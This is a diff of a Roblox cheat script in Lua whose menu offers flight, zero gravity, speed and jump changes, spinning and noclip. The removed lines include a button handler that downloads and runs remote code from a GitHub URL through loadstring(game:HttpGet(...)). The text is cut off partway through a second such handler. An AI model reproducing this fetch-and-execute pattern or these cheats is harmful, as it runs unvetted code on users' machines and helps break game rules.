@@ -1,7 +1,8 @@
--- 只因脚本 v4.2
+-- 只因脚本 v4.9 完整版
 -- 作者：只因蛋
--- 功能：完整飞行控制(自动适配手机/PC) + 设备识别 + 自适应UI + DOORS脚本 + 可拖动悬浮球 + 墨水游戏
+-- 功能：完整飞行控制 + 速度调节 + DOORS脚本 + 墨水游戏 + 可拖动悬浮球 + 可滑动高级设置
 
+-- 服务
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -9,20 +10,21 @@ local TweenService = game:GetService("TweenService")
 local GuiService = game:GetService("GuiService")
 local ContentProvider = game:GetService("ContentProvider")
 
+-- 玩家
 local player = Players.LocalPlayer
 
--- 设备类型检测
+-- 设备检测
 local IS_MOBILE = UserInputService.TouchEnabled
 local IS_CONSOLE = UserInputService.GamepadEnabled and not IS_MOBILE
 local IS_DESKTOP = not IS_MOBILE and not IS_CONSOLE
 
--- UI缩放因子 (手机设备缩小UI)
+-- UI缩放
 local UI_SCALE = IS_MOBILE and 0.8 or 1
 
 -- 确保PlayerGui存在
 repeat task.wait() until player:FindFirstChild("PlayerGui")
 
--- 创建屏幕GUI
+-- ========== 创建主UI ==========
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "FlightDoorsUI_Main"
 ScreenGui.ResetOnSpawn = false
@@ -30,7 +32,7 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.DisplayOrder = 10
 ScreenGui.Parent = player.PlayerGui
 
--- ========== 可拖动悬浮球 ==========
+-- ===== 可拖动悬浮球 =====
 local FloatingBall = Instance.new("ImageButton")
 FloatingBall.Name = "FloatingBall"
 FloatingBall.Size = UDim2.new(0, 80 * UI_SCALE, 0, 80 * UI_SCALE)
@@ -72,7 +74,7 @@ BallText.Font = Enum.Font.GothamBold
 BallText.ZIndex = 11
 BallText.Parent = FloatingBall
 
--- ========== 悬浮球拖动功能 ==========
+-- ===== 悬浮球拖动功能 =====
 local isDraggingBall = false
 local dragStartPos
 local ballStartPos
@@ -86,7 +88,7 @@ FloatingBall.InputBegan:Connect(function(input)
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if isDraggingBall and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
+    if isDraggingBall and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStartPos
         FloatingBall.Position = UDim2.new(
             ballStartPos.X.Scale, 
@@ -103,7 +105,7 @@ UserInputService.InputEnded:Connect(function(input)
     end
 end)
 
--- ========== 主控制面板 ==========
+-- ===== 主控制面板 =====
 local MainPanel = Instance.new("Frame")
 MainPanel.Name = "MainPanel"
 MainPanel.Size = UDim2.new(0, 500 * UI_SCALE, 0, 400 * UI_SCALE)
@@ -173,7 +175,7 @@ CloseButton.MouseLeave:Connect(function()
     TweenService:Create(CloseButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 90)}):Play()
 end)
 
--- ========== 玩家信息区 ==========
+-- ===== 玩家信息区 =====
 local PlayerInfo = Instance.new("Frame")
 PlayerInfo.Name = "PlayerInfo"
 PlayerInfo.Size = UDim2.new(1, -20 * UI_SCALE, 0, 80 * UI_SCALE)
@@ -260,7 +262,7 @@ WhitelistStatus.TextXAlignment = Enum.TextXAlignment.Left
 WhitelistStatus.ZIndex = 22
 WhitelistStatus.Parent = PlayerInfo
 
--- ========== 分类系统 ==========
+-- ===== 分类系统 =====
 local CategoryPanel = Instance.new("Frame")
 CategoryPanel.Name = "CategoryPanel"
 CategoryPanel.Size = UDim2.new(0, 120 * UI_SCALE, 0, 250 * UI_SCALE)
@@ -274,13 +276,17 @@ local CategoryCorner = Instance.new("UICorner")
 CategoryCorner.CornerRadius = UDim.new(0, 10, 0, 0)
 CategoryCorner.Parent = CategoryPanel
 
-local ContentPanel = Instance.new("Frame")
-ContentPanel.Name = "ContentPanel"
-ContentPanel.Size = UDim2.new(1, -120 * UI_SCALE, 0, 250 * UI_SCALE)
-ContentPanel.Position = UDim2.new(0, 120 * UI_SCALE, 0, 140 * UI_SCALE)
-ContentPanel.BackgroundTransparency = 1
-ContentPanel.ZIndex = 21
-ContentPanel.Parent = MainPanel
+-- 创建可滚动内容区域
+local ScrollFrame = Instance.new("ScrollingFrame")
+ScrollFrame.Name = "ScrollFrame"
+ScrollFrame.Size = UDim2.new(1, -120 * UI_SCALE, 0, 250 * UI_SCALE)
+ScrollFrame.Position = UDim2.new(0, 120 * UI_SCALE, 0, 140 * UI_SCALE)
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.ScrollBarThickness = 5
+ScrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 600 * UI_SCALE) -- 足够容纳所有内容
+ScrollFrame.ZIndex = 21
+ScrollFrame.Parent = MainPanel
 
 -- 创建分类按钮函数
 local function createCategoryButton(name, position)
@@ -321,7 +327,7 @@ local function createContentPage(name)
     frame.BackgroundTransparency = 1
     frame.Visible = false
     frame.ZIndex = 22
-    frame.Parent = ContentPanel
+    frame.Parent = ScrollFrame
     return frame
 end
 
@@ -336,7 +342,7 @@ local generalPage = createContentPage("General")
 local doorsPage = createContentPage("Doors")
 local inkGamePage = createContentPage("InkGame")
 
--- ========== 主页内容 ==========
+-- ===== 主页内容 =====
 local TimeLabel = Instance.new("TextLabel")
 TimeLabel.Name = "TimeLabel"
 TimeLabel.Size = UDim2.new(1, -20 * UI_SCALE, 0, 30 * UI_SCALE)
@@ -368,7 +374,7 @@ VersionLabel.Name = "VersionLabel"
 VersionLabel.Size = UDim2.new(1, -20 * UI_SCALE, 0, 30 * UI_SCALE)
 VersionLabel.Position = UDim2.new(0, 10 * UI_SCALE, 0, 120 * UI_SCALE)
 VersionLabel.BackgroundTransparency = 1
-VersionLabel.Text = "只因脚本 v4.2 ("..(IS_MOBILE and "手机版" or "电脑版")..")"
+VersionLabel.Text = "只因脚本 v4.9 ("..(IS_MOBILE and "手机版" or "电脑版")..")"
 VersionLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 VersionLabel.TextSize = 16 * UI_SCALE
 VersionLabel.Font = Enum.Font.Gotham
@@ -403,7 +409,7 @@ NoticeLabel.TextXAlignment = Enum.TextXAlignment.Left
 NoticeLabel.ZIndex = 23
 NoticeLabel.Parent = NoticeBackground
 
--- ========== 通用页面（飞行控制） ==========
+-- ===== 通用页面（飞行控制） =====
 local FlightStatus = Instance.new("TextLabel")
 FlightStatus.Name = "FlightStatus"
 FlightStatus.Size = UDim2.new(1, -20 * UI_SCALE, 0, 30 * UI_SCALE)
@@ -555,13 +561,189 @@ WalkSpeedValue.Font = Enum.Font.GothamBold
 WalkSpeedValue.ZIndex = 26
 WalkSpeedValue.Parent = WalkSpeedSlider
 
--- ========== DOORS页面 ==========
+-- ===== 高级设置区域 =====
+local AdvancedSettingsFrame = Instance.new("Frame")
+AdvancedSettingsFrame.Name = "AdvancedSettingsFrame"
+AdvancedSettingsFrame.Size = UDim2.new(0.9, 0, 0, 180 * UI_SCALE)
+AdvancedSettingsFrame.Position = UDim2.new(0.05, 0, 0, 270 * UI_SCALE)
+AdvancedSettingsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+AdvancedSettingsFrame.ZIndex = 23
+AdvancedSettingsFrame.Parent = generalPage
+
+local AdvancedSettingsCorner = Instance.new("UICorner")
+AdvancedSettingsCorner.CornerRadius = UDim.new(0, 10)
+AdvancedSettingsCorner.Parent = AdvancedSettingsFrame
+
+local AdvancedSettingsTitle = Instance.new("TextLabel")
+AdvancedSettingsTitle.Name = "AdvancedSettingsTitle"
+AdvancedSettingsTitle.Size = UDim2.new(1, -10 * UI_SCALE, 0, 30 * UI_SCALE)
+AdvancedSettingsTitle.Position = UDim2.new(0, 5 * UI_SCALE, 0, 5 * UI_SCALE)
+AdvancedSettingsTitle.BackgroundTransparency = 1
+AdvancedSettingsTitle.Text = "高级设置 ▼"
+AdvancedSettingsTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
+AdvancedSettingsTitle.TextSize = 18 * UI_SCALE
+AdvancedSettingsTitle.Font = Enum.Font.GothamBold
+AdvancedSettingsTitle.TextXAlignment = Enum.TextXAlignment.Left
+AdvancedSettingsTitle.ZIndex = 24
+AdvancedSettingsTitle.Parent = AdvancedSettingsFrame
+
+-- 旋转功能开关
+local SpinToggle = Instance.new("TextButton")
+SpinToggle.Name = "SpinToggle"
+SpinToggle.Size = UDim2.new(0.8, 0, 0, 40 * UI_SCALE)
+SpinToggle.Position = UDim2.new(0.1, 0, 0, 40 * UI_SCALE)
+SpinToggle.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
+SpinToggle.Text = "旋转: 关闭"
+SpinToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpinToggle.TextSize = 16 * UI_SCALE
+SpinToggle.Font = Enum.Font.GothamBold
+SpinToggle.ZIndex = 24
+SpinToggle.Parent = AdvancedSettingsFrame
+
+local SpinCorner = Instance.new("UICorner")
+SpinCorner.CornerRadius = UDim.new(0, 10)
+SpinCorner.Parent = SpinToggle
+
+SpinToggle.MouseEnter:Connect(function()
+    TweenService:Create(SpinToggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(90, 90, 100)}):Play()
+end)
+
+SpinToggle.MouseLeave:Connect(function()
+    TweenService:Create(SpinToggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 70, 80)}):Play()
+end)
+
+-- 旋转速度控制
+local SpinSpeedLabel = Instance.new("TextLabel")
+SpinSpeedLabel.Name = "SpinSpeedLabel"
+SpinSpeedLabel.Size = UDim2.new(1, -10 * UI_SCALE, 0, 25 * UI_SCALE)
+SpinSpeedLabel.Position = UDim2.new(0, 5 * UI_SCALE, 0, 90 * UI_SCALE)
+SpinSpeedLabel.BackgroundTransparency = 1
+SpinSpeedLabel.Text = "旋转速度: 50"
+SpinSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpinSpeedLabel.TextSize = 16 * UI_SCALE
+SpinSpeedLabel.Font = Enum.Font.GothamSemibold
+SpinSpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
+SpinSpeedLabel.ZIndex = 24
+SpinSpeedLabel.Parent = AdvancedSettingsFrame
+
+local SpinSpeedSlider = Instance.new("Frame")
+SpinSpeedSlider.Name = "SpinSpeedSlider"
+SpinSpeedSlider.Size = UDim2.new(1, -10 * UI_SCALE, 0, 20 * UI_SCALE)
+SpinSpeedSlider.Position = UDim2.new(0, 5 * UI_SCALE, 0, 120 * UI_SCALE)
+SpinSpeedSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+SpinSpeedSlider.ZIndex = 24
+SpinSpeedSlider.Parent = AdvancedSettingsFrame
+
+local SpinSpeedSliderCorner = Instance.new("UICorner")
+SpinSpeedSliderCorner.CornerRadius = UDim.new(0, 10)
+SpinSpeedSliderCorner.Parent = SpinSpeedSlider
+
+local SpinSpeedFill = Instance.new("Frame")
+SpinSpeedFill.Name = "SpinSpeedFill"
+SpinSpeedFill.Size = UDim2.new(0.5, 0, 1, 0)
+SpinSpeedFill.Position = UDim2.new(0, 0, 0, 0)
+SpinSpeedFill.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+SpinSpeedFill.ZIndex = 25
+SpinSpeedFill.Parent = SpinSpeedSlider
+
+local SpinSpeedFillCorner = Instance.new("UICorner")
+SpinSpeedFillCorner.CornerRadius = UDim.new(0, 10)
+SpinSpeedFillCorner.Parent = SpinSpeedFill
+
+local SpinSpeedValue = Instance.new("TextLabel")
+SpinSpeedValue.Name = "SpinSpeedValue"
+SpinSpeedValue.Size = UDim2.new(1, 0, 1, 0)
+SpinSpeedValue.Position = UDim2.new(0, 0, 0, 0)
+SpinSpeedValue.BackgroundTransparency = 1
+SpinSpeedValue.Text = "50"
+SpinSpeedValue.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpinSpeedValue.TextSize = 14 * UI_SCALE
+SpinSpeedValue.Font = Enum.Font.GothamBold
+SpinSpeedValue.ZIndex = 26
+SpinSpeedValue.Parent = SpinSpeedSlider
+
+-- 跳跃高度控制
+local JumpHeightLabel = Instance.new("TextLabel")
+JumpHeightLabel.Name = "JumpHeightLabel"
+JumpHeightLabel.Size = UDim2.new(1, -10 * UI_SCALE, 0, 25 * UI_SCALE)
+JumpHeightLabel.Position = UDim2.new(0, 5 * UI_SCALE, 0, 150 * UI_SCALE)
+JumpHeightLabel.BackgroundTransparency = 1
+JumpHeightLabel.Text = "跳跃高度: 50"
+JumpHeightLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+JumpHeightLabel.TextSize = 16 * UI_SCALE
+JumpHeightLabel.Font = Enum.Font.GothamSemibold
+JumpHeightLabel.TextXAlignment = Enum.TextXAlignment.Left
+JumpHeightLabel.ZIndex = 24
+JumpHeightLabel.Parent = AdvancedSettingsFrame
+
+local JumpHeightSlider = Instance.new("Frame")
+JumpHeightSlider.Name = "JumpHeightSlider"
+JumpHeightSlider.Size = UDim2.new(1, -10 * UI_SCALE, 0, 20 * UI_SCALE)
+JumpHeightSlider.Position = UDim2.new(0, 5 * UI_SCALE, 0, 180 * UI_SCALE)
+JumpHeightSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+JumpHeightSlider.ZIndex = 24
+JumpHeightSlider.Parent = AdvancedSettingsFrame
+
+local JumpHeightSliderCorner = Instance.new("UICorner")
+JumpHeightSliderCorner.CornerRadius = UDim.new(0, 10)
+JumpHeightSliderCorner.Parent = JumpHeightSlider
+
+local JumpHeightFill = Instance.new("Frame")
+JumpHeightFill.Name = "JumpHeightFill"
+JumpHeightFill.Size = UDim2.new(0.5, 0, 1, 0)
+JumpHeightFill.Position = UDim2.new(0, 0, 0, 0)
+JumpHeightFill.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+JumpHeightFill.ZIndex = 25
+JumpHeightFill.Parent = JumpHeightSlider
+
+local JumpHeightFillCorner = Instance.new("UICorner")
+JumpHeightFillCorner.CornerRadius = UDim.new(0, 10)
+JumpHeightFillCorner.Parent = JumpHeightFill
+
+local JumpHeightValue = Instance.new("TextLabel")
+JumpHeightValue.Name = "JumpHeightValue"
+JumpHeightValue.Size = UDim2.new(1, 0, 1, 0)
+JumpHeightValue.Position = UDim2.new(0, 0, 0, 0)
+JumpHeightValue.BackgroundTransparency = 1
+JumpHeightValue.Text = "50"
+JumpHeightValue.TextColor3 = Color3.fromRGB(255, 255, 255)
+JumpHeightValue.TextSize = 14 * UI_SCALE
+JumpHeightValue.Font = Enum.Font.GothamBold
+JumpHeightValue.ZIndex = 26
+JumpHeightValue.Parent = JumpHeightSlider
+
+-- 穿墙功能
+local NoclipToggle = Instance.new("TextButton")
+NoclipToggle.Name = "NoclipToggle"
+NoclipToggle.Size = UDim2.new(0.8, 0, 0, 40 * UI_SCALE)
+NoclipToggle.Position = UDim2.new(0.1, 0, 0, 210 * UI_SCALE)
+NoclipToggle.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
+NoclipToggle.Text = "穿墙: 关闭"
+NoclipToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+NoclipToggle.TextSize = 16 * UI_SCALE
+NoclipToggle.Font = Enum.Font.GothamBold
+NoclipToggle.ZIndex = 24
+NoclipToggle.Parent = AdvancedSettingsFrame
+
+local NoclipCorner = Instance.new("UICorner")
+NoclipCorner.CornerRadius = UDim.new(0, 10)
+NoclipCorner.Parent = NoclipToggle
+
+NoclipToggle.MouseEnter:Connect(function()
+    TweenService:Create(NoclipToggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(90, 90, 100)}):Play()
+end)
+
+NoclipToggle.MouseLeave:Connect(function()
+    TweenService:Create(NoclipToggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 70, 80)}):Play()
+end)
+
+-- ===== DOORS页面 =====
 local DoorsScriptButton = Instance.new("TextButton")
 DoorsScriptButton.Name = "DoorsScriptButton"
 DoorsScriptButton.Size = UDim2.new(0.9, 0, 0, 60 * UI_SCALE)
 DoorsScriptButton.Position = UDim2.new(0.05, 0, 0.1, 0)
 DoorsScriptButton.BackgroundColor3 = Color3.fromRGB(70, 30, 120)
-DoorsScriptButton.Text = "Doors脚本"
+DoorsScriptButton.Text = "DOORS脚本"
 DoorsScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 DoorsScriptButton.TextSize = 18 * UI_SCALE
 DoorsScriptButton.Font = Enum.Font.GothamBold
@@ -572,7 +754,6 @@ local DoorsScriptButtonCorner = Instance.new("UICorner")
 DoorsScriptButtonCorner.CornerRadius = UDim.new(0, 10)
 DoorsScriptButtonCorner.Parent = DoorsScriptButton
 
--- 按钮悬停效果
 DoorsScriptButton.MouseEnter:Connect(function()
     TweenService:Create(DoorsScriptButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(90, 50, 140)}):Play()
 end)
@@ -581,7 +762,7 @@ DoorsScriptButton.MouseLeave:Connect(function()
     TweenService:Create(DoorsScriptButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 30, 120)}):Play()
 end)
 
--- ========== 墨水游戏页面 ==========
+-- ===== 墨水游戏页面 =====
 local InkGameButton = Instance.new("TextButton")
 InkGameButton.Name = "InkGameButton"
 InkGameButton.Size = UDim2.new(0.9, 0, 0, 60 * UI_SCALE)
@@ -598,7 +779,6 @@ local InkGameButtonCorner = Instance.new("UICorner")
 InkGameButtonCorner.CornerRadius = UDim.new(0, 10)
 InkGameButtonCorner.Parent = InkGameButton
 
--- 按钮悬停效果
 InkGameButton.MouseEnter:Connect(function()
     TweenService:Create(InkGameButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 90, 140)}):Play()
 end)
@@ -607,7 +787,7 @@ InkGameButton.MouseLeave:Connect(function()
     TweenService:Create(InkGameButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 70, 120)}):Play()
 end)
 
--- ========== 功能实现 ==========
+-- ===== 功能实现 =====
 -- 飞行状态变量
 local isFlying = false
 local flySpeed = 16
@@ -618,6 +798,16 @@ local flightConnections = {}
 local originalGravity
 local originalAutoRotate
 local originalAnimateScript
+
+-- 旋转功能变量
+local isSpinning = false
+local spinSpeed = 50
+local spinConnection
+
+-- 穿墙功能变量
+local isNoclip = false
+local noclipConnection
+local originalCollision = {}
 
 -- 加载玩家头像
 local function loadPlayerAvatar()
@@ -642,6 +832,24 @@ local function updateSpeedDisplays()
     -- 更新角色行走速度
     if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
         player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = walkSpeed
+    end
+end
+
+-- 更新旋转速度显示
+local function updateSpinSpeedDisplay()
+    SpinSpeedValue.Text = tostring(math.floor(spinSpeed))
+    SpinSpeedLabel.Text = "旋转速度: "..math.floor(spinSpeed)
+    SpinSpeedFill.Size = UDim2.new((spinSpeed - 10) / 90, 0, 1, 0)
+end
+
+-- 更新跳跃高度显示
+local function updateJumpHeightDisplay()
+    JumpHeightValue.Text = tostring(math.floor(jumpHeight))
+    JumpHeightLabel.Text = "跳跃高度: "..math.floor(jumpHeight)
+    JumpHeightFill.Size = UDim2.new((jumpHeight - 10) / 90, 0, 1, 0)
+    
+    if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+        player.Character:FindFirstChildOfClass("Humanoid").JumpPower = jumpHeight
     end
 end
 
@@ -680,7 +888,71 @@ local function restoreAnimations(character)
     end
 end
 
--- 飞行功能（适配手机）
+-- 旋转功能
+local function toggleSpin()
+    isSpinning = not isSpinning
+    SpinToggle.Text = "旋转: "..(isSpinning and "开启" or "关闭")
+    
+    if isSpinning then
+        spinConnection = RunService.Heartbeat:Connect(function()
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local rootPart = player.Character.HumanoidRootPart
+                rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed/10), 0)
+            end
+        end)
+    else
+        if spinConnection then
+            spinConnection:Disconnect()
+            spinConnection = nil
+        end
+    end
+end
+
+-- 穿墙功能
+local function toggleNoclip()
+    isNoclip = not isNoclip
+    NoclipToggle.Text = "穿墙: "..(isNoclip and "开启" or "关闭")
+    
+    if isNoclip then
+        -- 保存原始碰撞状态
+        if player.Character then
+            originalCollision = {}
+            for _, part in ipairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    originalCollision[part] = part.CanCollide
+                    part.CanCollide = false
+                end
+            end
+        end
+        
+        -- 连接角色变化事件
+        noclipConnection = player.CharacterAdded:Connect(function(character)
+            task.wait(0.1)
+            for _, part in ipairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end)
+    else
+        -- 恢复原始碰撞状态
+        if player.Character and originalCollision then
+            for part, canCollide in pairs(originalCollision) do
+                if part and part.Parent then
+                    part.CanCollide = canCollide
+                end
+            end
+        end
+        
+        -- 断开连接
+        if noclipConnection then
+            noclipConnection:Disconnect()
+            noclipConnection = nil
+        end
+    end
+end
+
+-- 飞行功能
 local function toggleFlight()
     while not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChildOfClass("Humanoid") do
         player.CharacterAdded:Wait()
@@ -690,9 +962,9 @@ local function toggleFlight()
     isFlying = not isFlying
     
     -- 更新UI状态
-    if BallText then BallText.Text = isFlying and "关闭" or "开启" end
-    if FlightStatus then FlightStatus.Text = "飞行: "..(isFlying and "开启" or "关闭") end
-    if ToggleButton then ToggleButton.Text = isFlying and "关闭飞行" or "开启飞行" end
+    BallText.Text = isFlying and "关闭" or "开启"
+    FlightStatus.Text = "飞行: "..(isFlying and "开启" or "关闭")
+    ToggleButton.Text = isFlying and "关闭飞行" or "开启飞行"
     
     local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
     local humanoidRootPart = player.Character.HumanoidRootPart
@@ -730,7 +1002,7 @@ local function toggleFlight()
         -- 设置零重力
         workspace.Gravity = 0
         
-        -- 连接输入事件（适配手机）
+        -- 连接输入事件
         table.insert(flightConnections, RunService.Heartbeat:Connect(function()
             if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
             
@@ -738,74 +1010,52 @@ local function toggleFlight()
             local camera = workspace.CurrentCamera
             local cf = camera.CFrame
             
-            -- 计算移动方向（适配手机触摸控制）
+            -- 初始化移动方向
             local direction = Vector3.new()
+            local isMoving = false
             
-            -- 键盘控制
-            if UserInputService:IsKeyDown(Enum.KeyCode.W) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadUp) then 
-                direction = direction + cf.LookVector 
-            end
-            if UserInputService:IsKeyDown(Enum.KeyCode.S) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadDown) then 
-                direction = direction - cf.LookVector 
-            end
-            if UserInputService:IsKeyDown(Enum.KeyCode.D) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadRight) then 
-                direction = direction + cf.RightVector 
-            end
-            if UserInputService:IsKeyDown(Enum.KeyCode.A) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.DPadLeft) then 
-                direction = direction - cf.RightVector 
-            end
-            if UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonA) then 
-                direction = direction + Vector3.new(0, 1, 0) 
-            end
-            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsGamepadButtonDown(Enum.UserInputType.Gamepad1, Enum.KeyCode.ButtonB) then 
-                direction = direction - Vector3.new(0, 1, 0) 
-            end
-            
-            -- 手机触摸控制 (添加虚拟摇杆支持)
+            -- 手机触摸控制
             if IS_MOBILE then
-                -- 检测屏幕左侧触摸 (模拟摇杆)
-                for _, input in pairs(UserInputService:GetTouches()) do
-                    if input.Position.X < GuiService:GetScreenResolution().X / 2 then
-                        local touchPos = input.Position
-                        local center = Vector2.new(GuiService:GetScreenResolution().X / 4, GuiService:GetScreenResolution().Y / 2)
-                        local delta = (touchPos - center) / (GuiService:GetScreenResolution().Y / 4)
-                        
-                        -- 左右移动
-                        if delta.X > 0.2 then
-                            direction = direction + cf.RightVector * math.clamp(delta.X, 0, 1)
-                        elseif delta.X < -0.2 then
-                            direction = direction - cf.RightVector * math.clamp(-delta.X, 0, 1)
-                        end
-                        
-                        -- 前后移动
-                        if delta.Y > 0.2 then
-                            direction = direction - cf.LookVector * math.clamp(delta.Y, 0, 1)
-                        elseif delta.Y < -0.2 then
-                            direction = direction + cf.LookVector * math.clamp(-delta.Y, 0, 1)
-                        end
-                    end
+                -- 检测是否有触摸输入
+                local isTouching = false
+                for _, touch in ipairs(UserInputService:GetTouches()) do
+                    isTouching = true
+                    break
                 end
                 
-                -- 检测屏幕右侧触摸 (上升/下降)
-                for _, input in pairs(UserInputService:GetTouches()) do
-                    if input.Position.X > GuiService:GetScreenResolution().X / 2 then
-                        local touchPos = input.Position
-                        local center = Vector2.new(GuiService:GetScreenResolution().X * 3/4, GuiService:GetScreenResolution().Y / 2)
-                        local delta = (touchPos - center) / (GuiService:GetScreenResolution().Y / 4)
-                        
-                        -- 上升/下降
-                        if delta.Y > 0.2 then
-                            direction = direction - Vector3.new(0, 1, 0) * math.clamp(delta.Y, 0, 1)
-                        elseif delta.Y < -0.2 then
-                            direction = direction + Vector3.new(0, 1, 0) * math.clamp(-delta.Y, 0, 1)
+                -- 只要有触摸就朝视角方向飞行
+                if isTouching then
+                    direction = cf.LookVector
+                    isMoving = true
+                end
+                
+                -- 检测屏幕右侧触摸（上升/下降）
+                for _, touch in ipairs(UserInputService:GetTouches()) do
+                    if touch.Position.X > GuiService:GetScreenResolution().X / 2 then
+                        -- 触摸屏幕上半部分上升，下半部分下降
+                        if touch.Position.Y < GuiService:GetScreenResolution().Y / 2 then
+                            direction = direction + Vector3.new(0, 1, 0)
+                        else
+                            direction = direction - Vector3.new(0, 1, 0)
                         end
+                        isMoving = true
                     end
                 end
+            else
+                -- 键盘控制
+                if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction = direction + cf.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction = direction - cf.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction = direction + cf.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction = direction - cf.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction = direction + Vector3.new(0, 1, 0) end
+                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then direction = direction - Vector3.new(0, 1, 0) end
             end
             
             -- 标准化方向并应用速度
             if direction.Magnitude > 0 then
                 direction = direction.Unit * flySpeed
+            else
+                direction = Vector3.new(0, 0, 0)
             end
             
             -- 应用速度
@@ -840,109 +1090,11 @@ local function toggleFlight()
     end
 end
 
--- 显示/隐藏主面板
-local function toggleMainPanel()
-    MainPanel.Visible = not MainPanel.Visible
-    
-    if MainPanel.Visible then
-        -- 打开动画
-        MainPanel.Size = UDim2.new(0, 0, 0, 0)
-        MainPanel.Visible = true
-        TweenService:Create(MainPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500 * UI_SCALE, 0, 400 * UI_SCALE)}):Play()
-        
-        homePage.Visible = true
-        generalPage.Visible = false
-        doorsPage.Visible = false
-        inkGamePage.Visible = false
-        updateTime()
-    else
-        -- 关闭动画
-        TweenService:Create(MainPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)}):Play()
-        task.wait(0.2)
-        MainPanel.Visible = false
-    end
-end
-
--- 分类按钮点击事件
-homeButton.MouseButton1Click:Connect(function()
-    homePage.Visible = true
-    generalPage.Visible = false
-    doorsPage.Visible = false
-    inkGamePage.Visible = false
-    updateTime()
-end)
-
-generalButton.MouseButton1Click:Connect(function()
-    homePage.Visible = false
-    generalPage.Visible = true
-    doorsPage.Visible = false
-    inkGamePage.Visible = false
-    updateSpeedDisplays()
-end)
-
-doorsButton.MouseButton1Click:Connect(function()
-    homePage.Visible = false
-    generalPage.Visible = false
-    doorsPage.Visible = true
-    inkGamePage.Visible = false
-end)
-
-inkGameButton.MouseButton1Click:Connect(function()
-    homePage.Visible = false
-    generalPage.Visible = false
-    doorsPage.Visible = false
-    inkGamePage.Visible = true
-end)
-
--- DOORS脚本按钮点击事件
-DoorsScriptButton.MouseButton1Click:Connect(function()
-    local originalText = DoorsScriptButton.Text
-    DoorsScriptButton.Text = "加载中..."
-    
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing/main/Blackking%20Game"))()
-    end)
-    
-    if not success then
-        warn("DOORS脚本加载失败: "..tostring(err))
-        DoorsScriptButton.Text = "加载失败，点击重试"
-    else
-        DoorsScriptButton.Text = "已加载!"
-        task.wait(1)
-        DoorsScriptButton.Text = originalText
-    end
-end)
-
--- 墨水游戏按钮点击事件
-InkGameButton.MouseButton1Click:Connect(function()
-    local originalText = InkGameButton.Text
-    InkGameButton.Text = "加载中..."
-    
-    local success, err = pcall(function()
